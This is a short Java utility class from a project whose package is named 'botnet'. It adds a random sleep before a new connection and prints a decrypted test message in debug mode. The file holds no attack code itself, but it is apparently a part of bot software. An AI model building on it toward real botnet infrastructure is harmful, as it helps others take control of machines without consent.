package it.d0ge01.botnet.util;

import it.d0ge01.botnet.*;

public class NetUtil {
	public static void waitSlotTime() throws InterruptedException {
		double slotTime = Util.getRandTime();
		if ( Main.debug() )
			System.out.println("New connection, wait " + Math.round(slotTime*1000) + " seconds ....");
		Thread.sleep(Math.round(slotTime*1000.0));
		if ( Main.debug())
			System.out.println(CryptUtil.decryptMessage(10, "101|HELP|Piuno|pidue|extradatajfkafjslkjfkfsjfklj"));
	}
}
